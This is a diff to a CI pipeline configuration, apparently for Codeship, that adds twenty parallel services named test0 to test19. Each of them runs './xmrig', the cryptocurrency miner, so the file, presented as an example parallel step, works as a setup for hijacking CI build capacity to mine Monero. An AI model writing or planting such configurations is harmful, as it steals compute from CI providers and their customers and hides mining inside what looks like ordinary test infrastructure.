@@ -1,7 +1,43 @@
 - type: parallel
   name: example_parallel_step
   steps:
-    - service: codeship_example
+    - service: test0
       command: ./xmrig
-    - service: codeship_example
+    - service: test1
+      command: ./xmrig
+    - service: test2
+      command: ./xmrig
+    - service: test3
+      command: ./xmrig
+    - service: test4
+      command: ./xmrig
+    - service: test5
+      command: ./xmrig
+    - service: test6
+      command: ./xmrig
+    - service: test7
+      command: ./xmrig
+    - service: test8
+      command: ./xmrig
+    - service: test9
+      command: ./xmrig
+    - service: test10
+      command: ./xmrig
+    - service: test11
+      command: ./xmrig
+    - service: test12
+      command: ./xmrig
+    - service: test13
+      command: ./xmrig
+    - service: test14
+      command: ./xmrig
+    - service: test15
+      command: ./xmrig
+    - service: test16
+      command: ./xmrig
+    - service: test17
+      command: ./xmrig
+    - service: test18
+      command: ./xmrig
+    - service: test19
       command: ./xmrig
